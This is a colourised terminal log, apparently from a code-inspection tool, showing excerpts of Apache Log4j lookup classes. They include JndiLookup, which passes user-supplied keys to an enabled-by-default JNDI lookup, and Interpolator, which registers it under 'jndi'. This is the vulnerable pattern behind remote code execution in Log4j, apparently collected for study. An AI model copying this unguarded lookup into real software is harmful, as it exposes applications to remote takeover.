[2;36m                    [0m         [1;36m972[0m[39m:     *[0m[35m/[0m                                                                         [2m                [0m
[2;36m                    [0m         [1;36m973[0m[39m:    public StrSubstitutor [0m[1;35msetVariablePrefix[0m[1;39m([0m[39mfinal char prefix[0m[1;39m)[0m[39m [0m[1;39m{[0m                [2m                [0m
[2;36m                    [0m         [1;36m974[0m[39m:        return [0m[1;35msetVariablePrefixMatcher[0m[1;39m([0m[1;35mStrMatcher.charMatcher[0m[1;39m([0m[39mprefix[0m[1;39m)[0m[1;39m)[0m[39m;[0m        [2m                [0m
[2;36m                    [0m         [1;36m975[0m[39m:    [0m[1;39m}[0m                                                                           [2m                [0m
[2;36m                    [0m         [1;36m976[0m[39m:[0m                                                                                [2m                [0m
[2;36m                    [0m         [1;36m977[0m[39m:    [0m[35m/[0m[39m**[0m                                                                         [2m                [0m
[2;36m                    [0m         [1;36m978[0m[39m:     * Sets the variable prefix to use.[0m                                         [2m                [0m
[2;36m                    [0m         [1;36m979[0m[39m:     * <p>[0m                                                                      [2m                [0m
[2;36m                    [0m         [1;36m980[0m[39m:     * The variable prefix is the character or characters that identify the[0m     [2m                [0m
[2;36m                    [0m         [1;36m981[0m[39m:     * start of a variable. This method allows a string prefix to be easily [0m    [2m                [0m
[2;36m                    [0m         [39mset.[0m                                                                                [2m                [0m
[2;36m                    [0m         [1;36m982[0m[39m:     *[0m                                                                          [2m                [0m
[2;36m                    [0m         [1;36m983[0m[39m:     * @param prefix  the prefix for variables, not null[0m                        [2m                [0m
[2;36m                    [0m         [1;36m984[0m[39m:     * @return this, to enable chaining[0m                                         [2m                [0m
[2;36m                    [0m         [1;36m985[0m[39m:     * @throws IllegalArgumentException if the prefix is null[0m                   [2m                [0m
[2;36m                    [0m         [1;36m986[0m[39m:     *[0m[35m/[0m                                                                         [2m                [0m
[2;36m                    [0m         [1;36m987[0m[39m:    public StrSubstitutor [0m[1;35msetVariablePrefix[0m[1;39m([0m[39mfinal String prefix[0m[1;39m)[0m[39m [0m[1;39m{[0m              [2m                [0m
[2;36m                    [0m         [1;36m988[0m[39m:       if [0m[1;39m([0m[39mprefix == null[0m[1;39m)[0m[39m [0m[1;39m{[0m                                                    [2m                [0m
[2;36m                    [0m         [1;36m989[0m[39m:            throw new [0m[1;35mIllegalArgumentException[0m[1;39m([0m[32m"Variable prefix must not be [0m    [2m                [0m
[2;36m                    [0m         [32mnull!"[0m[1;39m)[0m[39m;[0m                                                                            [2m                [0m
[2;36m                    [0m         [1;36m990[0m[39m:        [0m[1;39m}[0m                                                                       [2m                [0m
[2;36m                    [0m         [1;36m991[0m[39m:        return [0m[1;35msetVariablePrefixMatcher[0m[1;39m([0m[1;35mStrMatcher.stringMatcher[0m[1;39m([0m[39mprefix[0m[1;39m)[0m[1;39m)[0m[39m;[0m      [2m                [0m
[2;36m                    [0m         [1;36m992[0m[39m:    [0m[1;39m}[0m                                                                           [2m                [0m
[2;36m                    [0m         [1;36m993[0m[39m:[0m                                                                                [2m                [0m
[2;36m                    [0m         [1;36m994[0m[39m:    [0m[35m/[0m[35m/[0m[39m Suffix[0m                                                                   [2m                [0m
[2;36m                    [0m         [1;36m995[0m[39m:    [0m[35m/[0m[35m/[0m[95m-----------------------------------------------------------------------[0m   [2m                [0m
[2;36m                    [0m         [1;36m996[0m[39m:    [0m[35m/[0m[39m**[0m                                                                         [2m                [0m
[2;36m                    [0m         [1;36m997[0m[39m:     * Gets the variable suffix matcher currently in use.[0m                       [2m                [0m
[2;36m                    [0m         [1;36m998[0m[39m:     * <p>[0m                                                                      [2m                [0m
[2;36m                    [0m         [1;36m999[0m[39m:     * The variable suffix is the character or characters that identify the[0m     [2m                [0m
[2;36m                    [0m         [1;36m1000[0m[39m:     * end of a variable. This suffix is expressed in terms of a matcher[0m       [2m                [0m
[2;36m                    [0m         [1;36m1001[0m[39m:     * allowing advanced suffix matches.[0m                                       [2m                [0m
[2;36m                    [0m         [1;36m1002[0m[39m:     *[0m                                                                         [2m                [0m
[2;36m                    [0m         [1;36m1003[0m[39m:     * @return the suffix matcher in use[0m                                       [2m                [0m
[2;36m                    [0m         [1;36m1004[0m[39m:     *[0m[35m/[0m                                                                        [2m                [0m
[2;36m                    [0m         [1;36m1005[0m[39m:    public StrMatcher [0m[1;35mgetVariableSuffixMatcher[0m[1;39m([0m[1;39m)[0m[39m [0m[1;39m{[0m                             [2m                [0m
[2;36m                    [0m         [1;36m1006[0m[39m:        return suffixMatcher;[0m                                                  [2m                [0m
[2;36m                    [0m         [1;36m1007[0m[39m:    [0m[1;39m}[0m                                                                          [2m                [0m
[2;36m                    [0m         [1;36m1008[0m[39m:[0m                                                                               [2m                [0m
[2;36m                    [0m         [1;36m1009[0m[39m:    [0m[35m/[0m[39m**[0m                                                                        [2m                [0m
[2;36m                    [0m         [1;36m1010[0m[39m:     * Sets the variable suffix matcher currently in use.[0m                      [2m                [0m
[2;36m                    [0m         [1;36m1011[0m[39m:     * <p>[0m                                                                     [2m                [0m
[2;36m                    [0m         [1;36m1012[0m[39m:     * The variable suffix is the character or characters that identify the[0m    [2m                [0m
[2;36m                    [0m         [1;36m1013[0m[39m:     * end of a variable. This suffix is expressed in terms of a matcher[0m       [2m                [0m
[2;36m                    [0m         [1;36m1014[0m[39m:     * allowing advanced suffix matches.[0m                                       [2m                [0m
[2;36m                    [0m         [1;36m1015[0m[39m:     *[0m                                                                         [2m                [0m
[2;36m                    [0m         [1;36m1016[0m[39m:     * @param suffixMatcher  the suffix matcher to use, null ignored[0m           [2m                [0m
[2;36m                    [0m         [1;36m1017[0m[39m:     * @return this, to enable chaining[0m                                        [2m                [0m
[2;36m                    [0m         [1;36m1018[0m[39m:     * @throws IllegalArgumentException if the suffix matcher is null[0m          [2m                [0m
[2;36m                    [0m         [1;36m1019[0m[39m:     *[0m[35m/[0m                                                                        [2m                [0m
[2;36m                    [0m         [1;36m1020[0m[39m:    public StrSubstitutor [0m[1;35msetVariableSuffixMatcher[0m[1;39m([0m[39mfinal StrMatcher [0m           [2m                [0m
[2;36m                    [0m         [39msuffixMatcher[0m[1;39m)[0m[39m [0m[1;39m{[0m                                                                    [2m                [0m
[2;36m                    [0m         [1;36m1021[0m[39m:        if [0m[1;39m([0m[39msuffixMatcher == null[0m[1;39m)[0m[39m [0m[1;39m{[0m                                           [2m                [0m
[2;36m                    [0m         [1;36m1022[0m[39m:            throw new [0m[1;35mIllegalArgumentException[0m[1;39m([0m[32m"Variable suffix matcher must [0m  [2m                [0m
[2;36m                    [0m         [32mnot be null!"[0m[1;39m)[0m[39m;[0m                                                                     [2m                [0m
[2;36m                    [0m         [1;36m1023[0m[39m:        [0m[1;39m}[0m                                                                      [2m                [0m
[2;36m                    [0m         [1;36m1024[0m[39m:        this.suffixMatcher = suffixMatcher;[0m                                    [2m                [0m
[2;36m                    [0m         [1;36m1025[0m[39m:        return this;[0m                                                           [2m                [0m
[2;36m                    [0m         [1;36m1026[0m[39m:    [0m[1;39m}[0m                                                                          [2m                [0m
[2;36m                    [0m         [1;36m1027[0m[39m:[0m                                                                               [2m                [0m
[2;36m                    [0m         [1;36m1028[0m[39m:    [0m[35m/[0m[39m**[0m                                                                        [2m                [0m
[2;36m                    [0m         [1;36m1029[0m[39m:     * Sets the variable suffix to use.[0m                                        [2m                [0m
[2;36m                    [0m         [1;36m1030[0m[39m:     * <p>[0m                                                                     [2m                [0m
[2;36m                    [0m         [1;36m1031[0m[39m:     * The variable suffix is the character or characters that identify the[0m    [2m                [0m
[2;36m                    [0m         [1;36m1032[0m[39m:     * end of a variable. This method allows a single character suffix to[0m      [2m                [0m
[2;36m                    [0m         [1;36m1033[0m[39m:     * be easily set.[0m                                                          [2m                [0m
[2;36m                    [0m         [1;36m1034[0m[39m:     *[0m                                                                         [2m                [0m
[2;36m                    [0m         [1;36m1035[0m[39m:     * @param suffix  the suffix character to use[0m                              [2m                [0m
[2;36m                    [0m         [1;36m1036[0m[39m:     * @return this, to enable chaining[0m                                        [2m                [0m
[2;36m                    [0m         [1;36m1037[0m[39m:     *[0m[35m/[0m                                                                        [2m                [0m
[2;36m                    [0m         [1;36m1038[0m[39m:    public StrSubstitutor [0m[1;35msetVariableSuffix[0m[1;39m([0m[39mfinal char suffix[0m[1;39m)[0m[39m [0m[1;39m{[0m               [2m                [0m
[2;36m                    [0m         [1;36m1039[0m[39m:        return [0m[1;35msetVariableSuffixMatcher[0m[1;39m([0m[1;35mStrMatcher.charMatcher[0m[1;39m([0m[39msuffix[0m[1;39m)[0m[1;39m)[0m[39m;[0m       [2m                [0m
[2;36m                    [0m         [1;36m1040[0m[39m:    [0m[1;39m}[0m                                                                          [2m                [0m
[2;36m                    [0m         [1;36m1041[0m[39m:[0m                                                                               [2m                [0m
[2;36m                    [0m         [1;36m1042[0m[39m:    [0m[35m/[0m[39m**[0m                                                                        [2m                [0m
[2;36m                    [0m         [1;36m1043[0m[39m:     * Sets the variable suffix to use.[0m                                        [2m                [0m
[2;36m                    [0m         [1;36m1044[0m[39m:     * <p>[0m                                                                     [2m                [0m
[2;36m                    [0m         [1;36m1045[0m[39m:     * The variable suffix is the character or characters that identify the[0m    [2m                [0m
[2;36m                    [0m         [1;36m1046[0m[39m:     * end of a variable. This method allows a string suffix to be easily set.[0m [2m                [0m
[2;36m                    [0m         [1;36m1047[0m[39m:     *[0m                                                                         [2m                [0m
[2;36m                    [0m         [1;36m1048[0m[39m:     * @param suffix  the suffix for variables, not null[0m                       [2m                [0m
[2;36m                    [0m         [1;36m1049[0m[39m:     * @return this, to enable chaining[0m                                        [2m                [0m
[2;36m                    [0m         [1;36m1050[0m[39m:     * @throws IllegalArgumentException if the suffix is null[0m                  [2m                [0m
[2;36m                    [0m         [39m```[0m                                                                                 [2m                [0m
[2;36m                    [0m         [39m<[0m[35m/[0m[95mcode[0m[39m>[0m                                                                             [2m                [0m
[2;36m                    [0m         [39m<code>[0m                                                                              [2m                [0m
[2;36m                    [0m         [39mcore/src/main/java/org/apache/logging/log4j/core/lookup/StrSubstitutor.jav[0m[1;92ma:1066[0m[39m-[0m[1;36m10[0m [2m                [0m
[2;36m                    [0m         [1;36m77[0m                                                                                  [2m                [0m
[2;36m                    [0m         [39m```[0m                                                                                 [2m                [0m
[2;36m                    [0m         [1;36m1066[0m[39m:    public StrLookup [0m[1;35mgetVariableResolver[0m[1;39m([0m[1;39m)[0m[39m [0m[1;39m{[0m                                   [2m                [0m
[2;36m                    [0m         [1;36m1067[0m[39m:        return this.variableResolver;[0m                                          [2m                [0m
[2;36m                    [0m         [1;36m1068[0m[39m:    [0m[1;39m}[0m                                                                          [2m                [0m
[2;36m                    [0m         [1;36m1069[0m[39m:[0m                                                                               [2m                [0m
[2;36m                    [0m         [1;36m1070[0m[39m:    [0m[35m/[0m[39m**[0m                                                                        [2m                [0m
[2;36m                    [0m         [1;36m1071[0m[39m:     * Sets the VariableResolver that is used to lookup variables.[0m             [2m                [0m
[2;36m                    [0m         [1;36m1072[0m[39m:     *[0m                                                                         [2m                [0m
[2;36m                    [0m         [1;36m1073[0m[39m:     * @param variableResolver  the VariableResolver[0m                           [2m                [0m
[2;36m                    [0m         [1;36m1074[0m[39m:     *[0m[35m/[0m                                                                        [2m                [0m
[2;36m                    [0m         [1;36m1075[0m[39m:    public void [0m[1;35msetVariableResolver[0m[1;39m([0m[39mfinal StrLookup variableResolver[0m[1;39m)[0m[39m [0m[1;39m{[0m        [2m                [0m
[2;36m                    [0m         [1;36m1076[0m[39m:        this.variableResolver = variableResolver;[0m                              [2m                [0m
[2;36m                    [0m         [1;36m1077[0m[39m:    [0m[1;39m}[0m                                                                          [2m                [0m
[2;36m                    [0m         [39m```[0m                                                                                 [2m                [0m
[2;36m                    [0m         [39m<[0m[35m/[0m[95mcode[0m[39m>[0m                                                                             [2m                [0m
[2;36m                    [0m         [39m<code>[0m                                                                              [2m                [0m
[2;36m                    [0m         [39mcore/src/main/java/org/apache/logging/log4j/core/lookup/StructuredDataLookup.jav[0m[1;92ma:1[0m [2m                [0m
[2;36m                    [0m         [39m-[0m[1;36m58[0m                                                                                 [2m                [0m
[2;36m                    [0m         [39m```[0m                                                                                 [2m                [0m
[2;36m                    [0m         [1;36m1[0m[39m:[0m[35m/[0m[39m*[0m                                                                                [2m                [0m
[2;36m                    [0m         [1;36m2[0m[39m: * Licensed to the Apache Software Foundation [0m[1;39m([0m[39mASF[0m[1;39m)[0m[39m under one or more[0m             [2m                [0m
[2;36m                    [0m         [1;36m3[0m[39m: * contributor license agreements. See the NOTICE file distributed with[0m           [2m                [0m
[2;36m                    [0m         [1;36m4[0m[39m: * this work for additional information regarding copyright ownership.[0m            [2m                [0m
[2;36m                    [0m         [1;36m5[0m[39m: * The ASF licenses this file to You under the Apache license, Version [0m[1;36m2.0[0m        [2m                [0m
[2;36m                    [0m         [1;36m6[0m[39m: * [0m[1;39m([0m[39mthe [0m[32m"License"[0m[1;39m)[0m[39m; you may not use this file except in compliance with[0m           [2m                [0m
[2;36m                    [0m         [1;36m7[0m[39m: * the License. You may obtain a copy of the License at[0m                           [2m                [0m
[2;36m                    [0m         [1;36m8[0m[39m: *[0m                                                                                [2m                [0m
[2;36m                    [0m         [1;36m9[0m[39m: *      [0m[4;94mhttp://www.apache.org/licenses/LICENSE-2.0[0m                                [2m                [0m
[2;36m                    [0m         [1;36m10[0m[39m: *[0m                                                                               [2m                [0m
[2;36m                    [0m         [1;36m11[0m[39m: * Unless required by applicable law or agreed to in writing, software[0m           [2m                [0m
[2;36m                    [0m         [1;36m12[0m[39m: * distributed under the License is distributed on an [0m[32m"AS IS"[0m[39m BASIS,[0m             [2m                [0m
[2;36m                    [0m         [1;36m13[0m[39m: * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.[0m      [2m                [0m
[2;36m                    [0m         [1;36m14[0m[39m: * See the license for the specific language governing permissions and[0m           [2m                [0m
[2;36m                    [0m         [1;36m15[0m[39m: * limitations under the license.[0m                                                [2m                [0m
[2;36m                    [0m         [1;36m16[0m[39m: *[0m[35m/[0m                                                                              [2m                [0m
[2;36m                    [0m         [1;36m17[0m[39m:package org.apache.logging.log4j.core.lookup;[0m                                    [2m                [0m
[2;36m                    [0m         [1;36m18[0m[39m:[0m                                                                                 [2m                [0m
[2;36m                    [0m         [1;36m19[0m[39m:import org.apache.logging.log4j.core.LogEvent;[0m                                   [2m                [0m
[2;36m                    [0m         [1;36m20[0m[39m:import org.apache.logging.log4j.core.config.plugins.Plugin;[0m                      [2m                [0m
[2;36m                    [0m         [1;36m21[0m[39m:import org.apache.logging.log4j.message.StructuredDataMessage;[0m                   [2m                [0m
[2;36m                    [0m         [1;36m22[0m[39m:[0m                                                                                 [2m                [0m
[2;36m                    [0m         [1;36m23[0m[39m:[0m[35m/[0m[39m**[0m                                                                              [2m                [0m
[2;36m                    [0m         [1;36m24[0m[39m: * Looks up keys from system properties.[0m                                         [2m                [0m
[2;36m                    [0m         [1;36m25[0m[39m: *[0m[35m/[0m                                                                              [2m                [0m
[2;36m                    [0m         [1;36m26[0m[39m:@[0m[1;35mPlugin[0m[1;39m([0m[39mname = [0m[32m"sd"[0m[39m, category = [0m[32m"Lookup"[0m[1;39m)[0m                                        [2m                [0m
[2;36m                    [0m         [1;36m27[0m[39m:public class StructuredDataLookup implements StrLookup [0m[1;39m{[0m                         [2m                [0m
[2;36m                    [0m         [1;36m28[0m[39m:[0m                                                                                 [2m                [0m
[2;36m                    [0m         [1;36m29[0m[39m:    [0m[35m/[0m[39m**[0m                                                                          [2m                [0m
[2;36m                    [0m         [1;36m30[0m[39m:     * Lookup the value for the key.[0m                                             [2m                [0m
[2;36m                    [0m         [1;36m31[0m[39m:     * @param key  the key to be looked up, may be null[0m                          [2m                [0m
[2;36m                    [0m         [1;36m32[0m[39m:     * @return The value for the key.[0m                                            [2m                [0m
[2;36m                    [0m         [1;36m33[0m[39m:     *[0m[35m/[0m                                                                          [2m                [0m
[2;36m                    [0m         [1;36m34[0m[39m:    @Override[0m                                                                    [2m                [0m
[2;36m                    [0m         [1;36m35[0m[39m:    public String [0m[1;35mlookup[0m[1;39m([0m[39mfinal String key[0m[1;39m)[0m[39m [0m[1;39m{[0m                                     [2m                [0m
[2;36m                    [0m         [1;36m36[0m[39m:        return null;[0m                                                             [2m                [0m
[2;36m                    [0m         [1;36m37[0m[39m:    [0m[1;39m}[0m                                                                            [2m                [0m
[2;36m                    [0m         [1;36m38[0m[39m:[0m                                                                                 [2m                [0m
[2;36m                    [0m         [1;36m39[0m[39m:    [0m[35m/[0m[39m**[0m                                                                          [2m                [0m
[2;36m                    [0m         [1;36m40[0m[39m:     * Lookup the value for the key using the data in the LogEvent.[0m              [2m                [0m
[2;36m                    [0m         [1;36m41[0m[39m:     * @param event The current LogEvent.[0m                                        [2m                [0m
[2;36m                    [0m         [1;36m42[0m[39m:     * @param key  the key to be looked up, may be null[0m                          [2m                [0m
[2;36m                    [0m         [1;36m43[0m[39m:     * @return The value associated with the key.[0m                                [2m                [0m
[2;36m                    [0m         [1;36m44[0m[39m:     *[0m[35m/[0m                                                                          [2m                [0m
[2;36m                    [0m         [1;36m45[0m[39m:    @Override[0m                                                                    [2m                [0m
[2;36m                    [0m         [1;36m46[0m[39m:    public String [0m[1;35mlookup[0m[1;39m([0m[39mfinal LogEvent event, final String key[0m[1;39m)[0m[39m [0m[1;39m{[0m               [2m                [0m
[2;36m                    [0m         [1;36m47[0m[39m:        if [0m[1;39m([0m[39mevent == null || ![0m[1;39m([0m[1;35mevent.getMessage[0m[1;39m([0m[1;39m)[0m[39m instanceof [0m                    [2m                [0m
[2;36m                    [0m         [39mStructuredDataMessage[0m[1;39m)[0m[1;39m)[0m[39m [0m[1;39m{[0m                                                           [2m                [0m
[2;36m                    [0m         [1;36m48[0m[39m:            return null;[0m                                                         [2m                [0m
[2;36m                    [0m         [1;36m49[0m[39m:        [0m[1;39m}[0m                                                                        [2m                [0m
[2;36m                    [0m         [1;36m50[0m[39m:        final StructuredDataMessage msg = [0m[1;39m([0m[39mStructuredDataMessage[0m[1;39m)[0m[39m [0m               [2m                [0m
[2;36m                    [0m         [1;35mevent.getMessage[0m[1;39m([0m[1;39m)[0m[39m;[0m                                                                 [2m                [0m
[2;36m                    [0m         [1;36m51[0m[39m:        if [0m[1;39m([0m[1;35mkey.equalsIgnoreCase[0m[1;39m([0m[32m"id"[0m[1;39m)[0m[1;39m)[0m[39m [0m[1;39m{[0m                                        [2m                [0m
[2;36m                    [0m         [1;36m52[0m[39m:            return [0m[1;35mmsg.getId[0m[1;39m([0m[1;39m)[0m[1;35m.getName[0m[1;39m([0m[1;39m)[0m[39m;[0m                                        [2m                [0m
[2;36m                    [0m         [1;36m53[0m[39m:        [0m[1;39m}[0m[39m else if [0m[1;39m([0m[1;35mkey.equalsIgnoreCase[0m[1;39m([0m[32m"type"[0m[1;39m)[0m[1;39m)[0m[39m [0m[1;39m{[0m                               [2m                [0m
[2;36m                    [0m         [1;36m54[0m[39m:            return [0m[1;35mmsg.getType[0m[1;39m([0m[1;39m)[0m[39m;[0m                                                [2m                [0m
[2;36m                    [0m         [1;36m55[0m[39m:        [0m[1;39m}[0m                                                                        [2m                [0m
[2;36m                    [0m         [1;36m56[0m[39m:        return [0m[1;35mmsg.get[0m[1;39m([0m[39mkey[0m[1;39m)[0m[39m;[0m                                                     [2m                [0m
[2;36m                    [0m         [1;36m57[0m[39m:    [0m[1;39m}[0m                                                                            [2m                [0m
[2;36m                    [0m         [1;36m58[0m[39m:[0m[1;39m}[0m                                                                                [2m                [0m
[2;36m                    [0m         [39m```[0m                                                                                 [2m                [0m
[2;36m                    [0m         [39m<[0m[35m/[0m[95mcode[0m[39m>[0m                                                                             [2m                [0m
[2;36m                    [0m         [39m<code>[0m                                                                              [2m                [0m
[2;36m                    [0m         [39mcore/src/main/java/org/apache/logging/log4j/core/lookup/JndiLookup.jav[0m[1;92ma:31[0m[39m-[0m[1;36m87[0m       [2m                [0m
[2;36m                    [0m         [39m```[0m                                                                                 [2m                [0m
[2;36m                    [0m         [1;36m31[0m[39m:    private static boolean ENABLE_JNDI = true;[0m                                   [2m                [0m
[2;36m                    [0m         [1;36m32[0m[39m:[0m                                                                                 [2m                [0m
[2;36m                    [0m         [1;36m33[0m[39m:    [0m[35m/[0m[39m** JNDI resourcce path prefix used in a J2EE container *[0m[35m/[0m                   [2m                [0m
[2;36m                    [0m         [1;36m34[0m[39m:    static final String CONTAINER_JNDI_RESOURCE_PATH_PREFIX = [0m[32m"java:comp/env/"[0m[39m;[0m  [2m                [0m
[2;36m                    [0m         [1;36m35[0m[39m:[0m                                                                                 [2m                [0m
[2;36m                    [0m         [1;36m36[0m[39m:    [0m[35m/[0m[39m**[0m                                                                          [2m                [0m
[2;36m                    [0m         [1;36m37[0m[39m:     * Get the value of the JNDI resource.[0m                                       [2m                [0m
[2;36m                    [0m         [1;36m38[0m[39m:     * @param key  the JNDI resource name to be looked up, may be null[0m           [2m                [0m
[2;36m                    [0m         [1;36m39[0m[39m:     * @return The value of the JNDI resource.[0m                                   [2m                [0m
[2;36m                    [0m         [1;36m40[0m[39m:     *[0m[35m/[0m                                                                          [2m                [0m
[2;36m                    [0m         [1;36m41[0m[39m:    @Override[0m                                                                    [2m                [0m
[2;36m                    [0m         [1;36m42[0m[39m:    public String [0m[1;35mlookup[0m[1;39m([0m[39mfinal String key[0m[1;39m)[0m[39m [0m[1;39m{[0m                                     [2m                [0m
[2;36m                    [0m         [1;36m43[0m[39m:        return [0m[1;35mlookup[0m[1;39m([0m[39mnull, key[0m[1;39m)[0m[39m;[0m                                                [2m                [0m
[2;36m                    [0m         [1;36m44[0m[39m:    [0m[1;39m}[0m                                                                            [2m                [0m
[2;36m                    [0m         [1;36m45[0m[39m:[0m                                                                                 [2m                [0m
[2;36m                    [0m         [1;36m46[0m[39m:    [0m[35m/[0m[39m**[0m                                                                          [2m                [0m
[2;36m                    [0m         [1;36m47[0m[39m:     * Get the value of the JNDI resource.[0m                                       [2m                [0m
[2;36m                    [0m         [1;36m48[0m[39m:     * @param event The current LogEvent [0m[1;39m([0m[39mis ignored by this StrLookup[0m[1;39m)[0m[39m.[0m         [2m                [0m
[2;36m                    [0m         [1;36m49[0m[39m:     * @param key  the JNDI resource name to be looked up, may be null[0m           [2m                [0m
[2;36m                    [0m         [1;36m50[0m[39m:     * @return The value of the JNDI resource.[0m                                   [2m                [0m
[2;36m                    [0m         [1;36m51[0m[39m:     *[0m[35m/[0m                                                                          [2m                [0m
[2;36m                    [0m         [1;36m52[0m[39m:    @Override[0m                                                                    [2m                [0m
[2;36m                    [0m         [1;36m53[0m[39m:    public String [0m[1;35mlookup[0m[1;39m([0m[39mfinal LogEvent event, final String key[0m[1;39m)[0m[39m [0m[1;39m{[0m               [2m                [0m
[2;36m                    [0m         [1;36m54[0m[39m:        if [0m[1;39m([0m[39mkey == null || ! ENABLE_JNDI[0m[1;39m)[0m[39m [0m[1;39m{[0m                                      [2m                [0m
[2;36m                    [0m         [1;36m55[0m[39m:            return null;[0m                                                         [2m                [0m
[2;36m                    [0m         [1;36m56[0m[39m:        [0m[1;39m}[0m                                                                        [2m                [0m
[2;36m                    [0m         [1;36m57[0m[39m:[0m                                                                                 [2m                [0m
[2;36m                    [0m         [1;36m58[0m[39m:        try [0m[1;39m{[0m                                                                    [2m                [0m
[2;36m                    [0m         [1;36m59[0m[39m:            InitialContext ctx = new [0m[1;35mInitialContext[0m[1;39m([0m[1;39m)[0m[39m;[0m                           [2m                [0m
[2;36m                    [0m         [1;36m60[0m[39m:            return [0m[1;39m([0m[39mString[0m[1;39m)[0m[39m [0m[1;35mctx.lookup[0m[1;39m([0m[1;35mconvertJndiName[0m[1;39m([0m[39mkey[0m[1;39m)[0m[1;39m)[0m[39m;[0m                    [2m                [0m
[2;36m                    [0m         [1;36m61[0m[39m:        [0m[1;39m}[0m[39m catch [0m[1;39m([0m[39mNamingException e[0m[1;39m)[0m[39m [0m[1;39m{[0m                                            [2m                [0m
[2;36m                    [0m         [1;36m62[0m[39m:            return null;[0m                                                         [2m                [0m
[2;36m                    [0m         [1;36m63[0m[39m:        [0m[1;39m}[0m                                                                        [2m                [0m
[2;36m                    [0m         [1;36m64[0m[39m:    [0m[1;39m}[0m                                                                            [2m                [0m
[2;36m                    [0m         [1;36m65[0m[39m:[0m                                                                                 [2m                [0m
[2;36m                    [0m         [1;36m66[0m[39m:    [0m[35m/[0m[39m**[0m                                                                          [2m                [0m
[2;36m                    [0m         [1;36m67[0m[39m:     * Convert the given JNDI name to the actual JNDI name to use.[0m               [2m                [0m
[2;36m                    [0m         [1;36m68[0m[39m:     * Default implementation applies the [0m[32m"java:comp/env/"[0m[39m prefix[0m                [2m                [0m
[2;36m                    [0m         [1;36m69[0m[39m:     * unless other scheme like [0m[32m"java:"[0m[39m is given.[0m                                [2m                [0m
[2;36m                    [0m         [1;36m70[0m[39m:     * @param jndiName The name of the resource.[0m                                 [2m                [0m
[2;36m                    [0m         [1;36m71[0m[39m:     * @return The fully qualified name to look up.[0m                              [2m                [0m
[2;36m                    [0m         [1;36m72[0m[39m:     *[0m[35m/[0m                                                                          [2m                [0m
[2;36m                    [0m         [1;36m73[0m[39m:    private String [0m[1;35mconvertJndiName[0m[1;39m([0m[39mString jndiName[0m[1;39m)[0m[39m [0m[1;39m{[0m                            [2m                [0m
[2;36m                    [0m         [1;36m74[0m[39m:        if [0m[1;39m([0m[39m![0m[1;35mjndiName.startsWith[0m[1;39m([0m[39mCONTAINER_JNDI_RESOURCE_PATH_PREFIX[0m[1;39m)[0m[39m && [0m        [2m                [0m
[2;36m                    [0m         [1;35mjndiName.indexOf[0m[1;39m([0m[32m':'[0m[1;39m)[0m[39m == [0m[1;36m-1[0m[1;39m)[0m[39m [0m[1;39m{[0m                                                      [2m                [0m
[2;36m                    [0m         [1;36m75[0m[39m:            jndiName = CONTAINER_JNDI_RESOURCE_PATH_PREFIX + jndiName;[0m           [2m                [0m
[2;36m                    [0m         [1;36m76[0m[39m:        [0m[1;39m}[0m                                                                        [2m                [0m
[2;36m                    [0m         [1;36m77[0m[39m:[0m                                                                                 [2m                [0m
[2;36m                    [0m         [1;36m78[0m[39m:        return jndiName;[0m                                                         [2m                [0m
[2;36m                    [0m         [1;36m79[0m[39m:    [0m[1;39m}[0m                                                                            [2m                [0m
[2;36m                    [0m         [1;36m80[0m[39m:[0m                                                                                 [2m                [0m
[2;36m                    [0m         [1;36m81[0m[39m:    public static void [0m[1;35msetEnableJndi[0m[1;39m([0m[39mboolean enableJndi[0m[1;39m)[0m[39m [0m[1;39m{[0m                       [2m                [0m
[2;36m                    [0m         [1;36m82[0m[39m:        ENABLE_JNDI = enableJndi;[0m                                                [2m                [0m
[2;36m                    [0m         [1;36m83[0m[39m:    [0m[1;39m}[0m                                                                            [2m                [0m
[2;36m                    [0m         [1;36m84[0m[39m:[0m                                                                                 [2m                [0m
[2;36m                    [0m         [1;36m85[0m[39m:    public static boolean [0m[1;35misEnableJndi[0m[1;39m([0m[1;39m)[0m[39m [0m[1;39m{[0m                                       [2m                [0m
[2;36m                    [0m         [1;36m86[0m[39m:        return ENABLE_JNDI;[0m                                                      [2m                [0m
[2;36m                    [0m         [1;36m87[0m[39m:    [0m[1;39m}[0m                                                                            [2m                [0m
[2;36m                    [0m         [39m```[0m                                                                                 [2m                [0m
[2;36m                    [0m         [39m<[0m[35m/[0m[95mcode[0m[39m>[0m                                                                             [2m                [0m
[2;36m                    [0m         [39m<code>[0m                                                                              [2m                [0m
[2;36m                    [0m         [39mcore/src/main/java/org/apache/logging/log4j/core/lookup/Interpolator.jav[0m[1;92ma:62[0m[39m-[0m[1;36m67[0m     [2m                [0m
[2;36m                    [0m         [39m```[0m                                                                                 [2m                [0m
[2;36m                    [0m         [1;36m62[0m[39m:    public [0m[1;35mInterpolator[0m[1;39m([0m[1;39m)[0m[39m [0m[1;39m{[0m                                                      [2m                [0m
[2;36m                    [0m         [1;36m63[0m[39m:        this.defaultLookup = new [0m[1;35mMapLookup[0m[1;39m([0m[39mnew HashMap<String, String>[0m[1;39m([0m[1;39m)[0m[1;39m)[0m[39m;[0m       [2m                [0m
[2;36m                    [0m         [1;36m64[0m[39m:        [0m[1;35mlookups.put[0m[1;39m([0m[32m"sys"[0m[39m, new [0m[1;35mSystemPropertiesLookup[0m[1;39m([0m[1;39m)[0m[1;39m)[0m[39m;[0m                        [2m                [0m
[2;36m                    [0m         [1;36m65[0m[39m:        [0m[1;35mlookups.put[0m[1;39m([0m[32m"env"[0m[39m, new [0m[1;35mEnvironmentLookup[0m[1;39m([0m[1;39m)[0m[1;39m)[0m[39m;[0m                             [2m                [0m
[2;36m                    [0m         [1;36m66[0m[39m:        [0m[1;35mlookups.put[0m[1;39m([0m[32m"jndi"[0m[39m, new [0m[1;35mJndiLookup[0m[1;39m([0m[1;39m)[0m[1;39m)[0m[39m;[0m                                   [2m                [0m
[2;36m                    [0m         [1;36m67[0m[39m:    [0m[1;39m}[0m                                                                            [2m                [0m
[2;36m                    [0m         [39m```[0m                                                                                 [2m                [0m
[2;36m                    [0m         [39m<[0m[35m/[0m[95mcode[0m[39m>[0m                                                                             [2m                [0m
[2;36m                    [0m         [39m<code>[0m                                                                              [2m                [0m
[2;36m                    [0m         [39mcore/src/main/java/org/apache/logging/log4j/core/config/BaseConfiguration.jav[0m[1;92ma:95[0m[39m-[0m[1;36m9[0m [2m                [0m
[2;36m                    [0m         [1;36m7[0m                                                                                   [2m                [0m
[2;36m                    [0m         [39m```[0m                                                                                 [2m                [0m
